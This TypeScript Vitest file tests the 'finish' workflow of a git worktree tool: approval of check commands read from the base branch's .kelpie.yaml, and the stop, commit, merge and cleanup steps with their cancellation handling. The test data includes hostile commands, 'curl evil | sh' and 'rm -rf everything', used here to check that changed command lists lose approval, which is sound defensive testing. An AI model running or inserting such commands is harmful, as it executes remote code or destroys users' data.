import { beforeEach, describe, expect, it, vi } from "vitest";

const calls: string[] = [];
const ipc = {
  gitShowFile: vi.fn(),
  finishInspect: vi.fn(),
  finishWipCommit: vi.fn(),
  finishIntegrate: vi.fn(),
  finishRestoreBranch: vi.fn(),
  finishReset: vi.fn(),
  daemon: vi.fn(),
};
const stopSessions = vi.fn();
const removeWorktree = vi.fn();
const setProjectStatus = vi.fn();
const reportEvent = vi.fn();
const store = {
  state: { approvedSetups: {} as Record<string, string>, approvedChecks: {} as Record<string, string[]> },
  sessions: {},
  metaFor: vi.fn(() => undefined as { comment?: string } | undefined),
  setProjectStatus,
  notify: vi.fn(),
};
vi.mock("./store", () => ({ store }));
vi.mock("./ipc", () => ipc);
vi.mock("./automation-events", () => ({ automationEvents: { report: reportEvent } }));
vi.mock("./terminal-host", () => ({ disposeView: vi.fn() }));
vi.mock("./worktrees", async () => ({ ...(await vi.importActual<typeof import("./worktrees")>("./worktrees")), stopSessions, removeWorktree }));

const { defaultMessage, diffChecks, loadChecksPlan, needsDecision, planChecks, runFinish, runnable } = await import("./finish");
import type { Project } from "./types";

const repo = { id: "r", name: "repo", path: "C:/work/repo" } as Project;
const wt = { id: "w", name: "fix-login", path: "C:/work/repo-worktrees/fix-login", parentId: "r" } as Project;

const inspect = (extra: Record<string, unknown> = {}) => ({ branch: "fix-login", uncommitted: [], embedded: [], conflicts: [], operation: null, merge_conflicts: [], base_checkout: null, base_checkout_dirty: false, ...extra });

beforeEach(() => {
  calls.length = 0;
  vi.clearAllMocks();
  store.state.approvedSetups = {};
  store.state.approvedChecks = {};
  stopSessions.mockResolvedValue(true);
  removeWorktree.mockResolvedValue({ leftover: false });
  ipc.finishInspect.mockResolvedValue(inspect());
  ipc.finishWipCommit.mockResolvedValue({ commit: "a".repeat(40), extra: [] });
  ipc.finishRestoreBranch.mockResolvedValue(undefined);
  ipc.finishReset.mockResolvedValue(undefined);
  ipc.daemon.mockResolvedValue({});
});

describe("the checks that may run", () => {
  it("come from the base branch's committed file, never the working copy or the branch", async () => {
    ipc.gitShowFile.mockResolvedValue("check:\n  - npm test\n");
    const plan = await loadChecksPlan(repo, "main", false);
    expect(ipc.gitShowFile).toHaveBeenCalledWith("C:/work/repo", "refs/heads/main", ".kelpie.yaml");
    expect(plan.commands).toEqual(["npm test"]);
    expect(ipc.gitShowFile).not.toHaveBeenCalledWith(expect.anything(), "HEAD", expect.anything());
  });

  it("need exactly this list to be approved, and approving the setup does not approve them", async () => {
    ipc.gitShowFile.mockResolvedValue("setup: [pnpm i]\ncheck:\n  - npm test\n");
    store.state.approvedSetups["c:/work/repo"] = "whatever-the-setup-hash-is";
    expect((await loadChecksPlan(repo, "main", false)).approved).toBe(false);
    store.state.approvedChecks["c:/work/repo"] = ["npm test"];
    const plan = await loadChecksPlan(repo, "main", false);
    expect(plan.approved).toBe(true);
    expect(runnable(plan, false)).toBe(true);
    // The base's list changes: the earlier approval no longer covers it, and the earlier list is kept for the diff.
    ipc.gitShowFile.mockResolvedValue("check:\n  - npm test\n  - curl evil | sh\n");
    const changed = await loadChecksPlan(repo, "main", false);
    expect(changed.approved).toBe(false);
    expect(changed.previous).toEqual(["npm test"]);
    expect(runnable(changed, false)).toBe(false);
    expect(diffChecks(changed.previous!, changed.commands)).toEqual([{ text: "npm test", kind: "same" }, { text: "curl evil | sh", kind: "added" }]);
  });

  it("do not depend on the rest of the file: a changed setup leaves an approved list approved", async () => {
    store.state.approvedChecks["c:/work/repo"] = ["npm test"];
    ipc.gitShowFile.mockResolvedValue("setup: [rm -rf everything]\ncheck:\n  - npm test\n");
    expect((await loadChecksPlan(repo, "main", false)).approved).toBe(true);
  });

  it("are blocked when the branch edits .kelpie.yaml, unless the user allows the base's list", async () => {
    ipc.gitShowFile.mockResolvedValue("check:\n  - npm test\n");
    store.state.approvedChecks["c:/work/repo"] = ["npm test"];
    const plan = await loadChecksPlan(repo, "main", true);
    expect(plan.blocked).toBe(true);
    expect(runnable(plan, false)).toBe(false);
    expect(runnable(plan, true)).toBe(true);
    expect(needsDecision(plan, false)).toBe(true);
    expect(needsDecision(plan, true)).toBe(false);
  });

  it("are none without a file; an unreadable file needs a decision rather than silently running nothing", async () => {
    ipc.gitShowFile.mockResolvedValue(null);
    const none = await loadChecksPlan(repo, "main", true);
    expect(none.commands).toEqual([]);
    expect(none.blocked).toBe(false);
    expect(needsDecision(none, false)).toBe(false);
    ipc.gitShowFile.mockResolvedValue("check: [unclosed\n");
    const bad = await loadChecksPlan(repo, "main", false);
    expect(bad.error).toBeTruthy();
    expect(needsDecision(bad, false)).toBe(true);
    expect(needsDecision(bad, true)).toBe(true);
  });

  it("show removed commands first in the diff", () => {
    expect(diffChecks(["a", "b"], ["b", "c"])).toEqual([{ text: "a", kind: "removed" }, { text: "b", kind: "same" }, { text: "c", kind: "added" }]);
    expect(planChecks({ config: null, approved: false, previous: null, candidateEditsConfig: true }).blocked).toBe(false);
  });
});

describe("the message draft", () => {
  it("is the card's comment, else the branch as words", () => {
    expect(defaultMessage(wt, "fix-login-redirect")).toBe("Fix login redirect");
    expect(defaultMessage(wt, "feature/dark_mode")).toBe("Dark mode");
    store.metaFor.mockReturnValueOnce({ comment: "Fix the login redirect\nmore" });
    expect(defaultMessage(wt, "x")).toBe("Fix the login redirect");
  });
});

const input = { worktree: wt, repo, branch: "fix-login", base: "main", strategy: "squash" as const, message: "Fix login", confirmed: [] as string[], checks: [], copy: [], link: [], allowConfigChange: false };
const merged = { state: "merged", commit: "c".repeat(40), tip: "t".repeat(40), checkout_updated: "C:/work/repo", branch_deleted: true, branch_note: null, checks: [] };
const file = (path: string) => ({ path, status: "M", size: 10 });

describe("runFinish", () => {
  it("stops sessions first and touches nothing when they do not stop", async () => {
    stopSessions.mockResolvedValue(false);
    const r = await runFinish({ ...input, confirmed: ["a.txt"] });
    expect(r).toMatchObject({ kind: "stopped", problem: { why: "sessions" } });
    expect(ipc.finishInspect).not.toHaveBeenCalled();
    expect(ipc.finishWipCommit).not.toHaveBeenCalled();
    expect(ipc.finishIntegrate).not.toHaveBeenCalled();
    expect(removeWorktree).not.toHaveBeenCalled();
  });

  it("lists the files only after the sessions stopped, commits exactly those, then merges, marks done and removes last", async () => {
    ipc.finishInspect.mockImplementation(async () => {
      calls.push("inspect");
      return inspect({ uncommitted: [file("a.txt"), file("b.txt")] });
    });
    stopSessions.mockImplementation(async () => {
      calls.push("stop");
      return true;
    });
    ipc.finishWipCommit.mockImplementation(async () => {
      calls.push("wip");
      return { commit: "a".repeat(40), extra: [] };
    });
    ipc.finishIntegrate.mockImplementation(async () => {
      calls.push("integrate");
      return merged;
    });
    setProjectStatus.mockImplementation(() => calls.push("done"));
    ipc.daemon.mockImplementation(async () => calls.push("drop"));
    removeWorktree.mockImplementation(async () => {
      calls.push("remove");
      return { leftover: false };
    });
    const r = await runFinish({ ...input, confirmed: ["a.txt", "b.txt", "gone.txt"] });
    expect(r.kind).toBe("finished");
    expect(calls).toEqual(["stop", "inspect", "wip", "integrate", "done", "drop", "remove"]);
    expect(ipc.finishWipCommit).toHaveBeenCalledWith(wt.path, "fix-login", expect.stringMatching(/^WIP from /), ["a.txt", "b.txt"]);
    expect(ipc.daemon).toHaveBeenCalledWith("checkpoint.drop", { worktree: wt.path, root: repo.path });
    expect(removeWorktree).toHaveBeenCalledWith(wt, { force: false });
    // Automations hear that the worktree is finished, in the project it came from.
    expect(reportEvent).toHaveBeenCalledWith(expect.objectContaining({ kind: "finished", root: repo.path, branch: "fix-login" }));
  });

  it("makes no WIP commit when nothing is uncommitted", async () => {
    ipc.finishIntegrate.mockResolvedValue(merged);
    await runFinish(input);
    expect(ipc.finishWipCommit).not.toHaveBeenCalled();
  });

  it("stops when files the user never confirmed appeared meanwhile", async () => {
    ipc.finishInspect.mockResolvedValue(inspect({ uncommitted: [file("a.txt"), file("late.env")] }));
    const r = await runFinish({ ...input, confirmed: ["a.txt"] });
    expect(r).toMatchObject({ kind: "stopped", problem: { why: "files_changed", files: ["a.txt", "late.env"] } });
    expect(ipc.finishWipCommit).not.toHaveBeenCalled();
    expect(ipc.finishIntegrate).not.toHaveBeenCalled();
    // …also when the list was empty at confirmation time.
    ipc.finishInspect.mockResolvedValue(inspect({ uncommitted: [file("late.env")] }));
    expect(await runFinish(input)).toMatchObject({ kind: "stopped", problem: { why: "files_changed" } });
  });

  it("stops when the backend says more arrived while committing", async () => {
    ipc.finishInspect.mockResolvedValue(inspect({ uncommitted: [file("a.txt")] }));
    ipc.finishWipCommit.mockResolvedValue({ commit: null, extra: ["late.env"] });
    const r = await runFinish({ ...input, confirmed: ["a.txt"] });
    expect(r).toMatchObject({ kind: "stopped", problem: { why: "files_changed" } });
    expect(ipc.finishIntegrate).not.toHaveBeenCalled();
  });

  it("uses the branch the worktree is really on, and refuses a detached or different one", async () => {
    ipc.finishInspect.mockResolvedValue(inspect({ branch: null }));
    expect(await runFinish(input)).toMatchObject({ kind: "stopped", problem: { why: "not_on_branch", branch: null } });
    ipc.finishInspect.mockResolvedValue(inspect({ branch: "other" }));
    expect(await runFinish(input)).toMatchObject({ kind: "stopped", problem: { why: "not_on_branch", branch: "other" } });
    expect(ipc.finishIntegrate).not.toHaveBeenCalled();
    expect(removeWorktree).not.toHaveBeenCalled();
  });

  it("refuses embedded repositories, open operations and conflicts", async () => {
    ipc.finishInspect.mockResolvedValue(inspect({ embedded: ["vendor/lib/"] }));
    expect(await runFinish(input)).toMatchObject({ problem: { why: "embedded" } });
    ipc.finishInspect.mockResolvedValue(inspect({ operation: "rebase" }));
    expect(await runFinish(input)).toMatchObject({ problem: { why: "error" } });
    expect(ipc.finishWipCommit).not.toHaveBeenCalled();
  });

  it("passes the worktree, the approved list and the user's choice about a changed config to the merge", async () => {
    ipc.finishIntegrate.mockResolvedValue(merged);
    await runFinish({ ...input, checks: ["npm test"], copy: [".env"], link: ["node_modules"], allowConfigChange: true });
    expect(ipc.finishIntegrate).toHaveBeenCalledWith({
      root: repo.path, worktree: wt.path, branch: "fix-login", base: "main", strategy: "squash", message: "Fix login",
      checks: ["npm test"], copy: [".env"], link: ["node_modules"], allow_config_change: true, delete_branch: true,
    });
  });

  for (const [name, reply, why] of [
    ["a conflict", { state: "conflict", files: ["a.txt"] }, "conflict"],
    ["a failing check", { state: "check_failed", checks: [{ command: "npm test", ok: false, code: 1, output: "boom" }], cleanup_error: null }, "checks"],
    ["a branch that edits the config", { state: "config_blocked", files: [".kelpie.yaml"] }, "config_blocked"],
    ["a base that moved", { state: "base_moved" }, "base_moved"],
    ["a dirty main checkout", { state: "checkout_dirty", path: "C:/work/repo", files: [] }, "checkout_dirty"],
    ["files that appeared late", { state: "worktree_changed", files: ["late.txt"] }, "files_changed"],
    ["Cancel", { state: "cancelled" }, "cancelled"],
  ] as const) {
    it(`leaves the worktree and the card alone after ${name}`, async () => {
      ipc.finishIntegrate.mockResolvedValue(reply);
      const r = await runFinish(input);
      expect(r).toMatchObject({ kind: "stopped", problem: { why } });
      expect(setProjectStatus).not.toHaveBeenCalled();
      expect(removeWorktree).not.toHaveBeenCalled();
    });
  }

  it("puts the branch back when the worktree cannot be removed after the branch was deleted", async () => {
    ipc.finishIntegrate.mockResolvedValue(merged);
    removeWorktree.mockRejectedValue(new Error("Permission denied"));
    const r = await runFinish(input);
    expect(r).toMatchObject({ kind: "merged" });
    expect((r as { problem: string }).problem).toContain("merged into main");
    expect((r as { problem: string }).problem).toContain("Permission denied");
    expect(setProjectStatus).toHaveBeenCalledWith("w", "done");
    expect(ipc.finishRestoreBranch).toHaveBeenCalledWith(repo.path, "fix-login", merged.tip, wt.path);
  });

  it("keeps a branch it did not delete as it is", async () => {
    ipc.finishIntegrate.mockResolvedValue({ ...merged, branch_deleted: false, branch_note: "the branch has changes the base does not contain" });
    removeWorktree.mockRejectedValue(new Error("busy"));
    await runFinish(input);
    expect(ipc.finishRestoreBranch).not.toHaveBeenCalled();
  });

  it("forgets a Cancel when a Finish begins and when it ends, whatever way it ends", async () => {
    ipc.finishIntegrate.mockResolvedValue(merged);
    await runFinish(input);
    ipc.finishInspect.mockResolvedValue(inspect({ branch: null }));
    await runFinish(input);
    ipc.finishIntegrate.mockRejectedValue(new Error("boom"));
    ipc.finishInspect.mockResolvedValue(inspect());
    await runFinish(input);
    // begin + end of each of the three runs, first call before any other backend call
    expect(ipc.finishReset).toHaveBeenCalledTimes(6);
    expect(ipc.finishReset).toHaveBeenCalledWith(wt.path);
  });

  it("honours Cancel at every step before the merge, and nothing is changed", async () => {
    const steps: [string, (c: { requested: boolean }) => void][] = [
      ["while the sessions stop", (c) => stopSessions.mockImplementation(async () => ((c.requested = true), true))],
      ["while the worktree is read", (c) => ipc.finishInspect.mockImplementation(async () => ((c.requested = true), inspect()))],
      ["while the WIP commit is made", (c) => {
        ipc.finishInspect.mockResolvedValue(inspect({ uncommitted: [file("a.txt")] }));
        ipc.finishWipCommit.mockImplementation(async () => ((c.requested = true), { commit: "a".repeat(40), extra: [] }));
      }],
      ["when the WIP commit is cancelled underneath", (c) => {
        ipc.finishInspect.mockResolvedValue(inspect({ uncommitted: [file("a.txt")] }));
        ipc.finishWipCommit.mockImplementation(async () => ((c.requested = true), Promise.reject(new Error("the WIP commit failed: cancelled"))));
      }],
      ["while the merge runs (the backend reports it)", (c) => ipc.finishIntegrate.mockImplementation(async () => ((c.requested = true), { state: "cancelled" }))],
    ];
    for (const [name, arm] of steps) {
      vi.clearAllMocks();
      stopSessions.mockResolvedValue(true);
      ipc.finishInspect.mockResolvedValue(inspect());
      ipc.finishWipCommit.mockResolvedValue({ commit: "a".repeat(40), extra: [] });
      ipc.finishIntegrate.mockResolvedValue(merged);
      ipc.finishReset.mockResolvedValue(undefined);
      const cancel = { requested: false };
      arm(cancel);
      const r = await runFinish({ ...input, confirmed: ["a.txt"], cancel });
      expect(r, name).toMatchObject({ kind: "stopped", problem: { why: "cancelled" } });
      expect(removeWorktree, name).not.toHaveBeenCalled();
      expect(setProjectStatus, name).not.toHaveBeenCalled();
    }
  });

  it("reports the truth when Cancel arrives after the base moved: merged, nothing removed, branch put back", async () => {
    const cancel = { requested: false };
    ipc.finishIntegrate.mockImplementation(async () => ((cancel.requested = true), merged));
    const r = await runFinish({ ...input, cancel });
    expect(r).toMatchObject({ kind: "merged" });
    expect((r as { problem: string }).problem).toContain("merged into main");
    expect(removeWorktree).not.toHaveBeenCalled();
    expect(setProjectStatus).toHaveBeenCalledWith("w", "done");
    expect(ipc.finishRestoreBranch).toHaveBeenCalledWith(repo.path, "fix-login", merged.tip, wt.path);
  });

  it("reports an unexpected error and stops", async () => {
    ipc.finishIntegrate.mockRejectedValue(new Error("git exploded"));
    expect(await runFinish(input)).toMatchObject({ kind: "stopped", problem: { why: "error", message: "git exploded" } });
  });
});
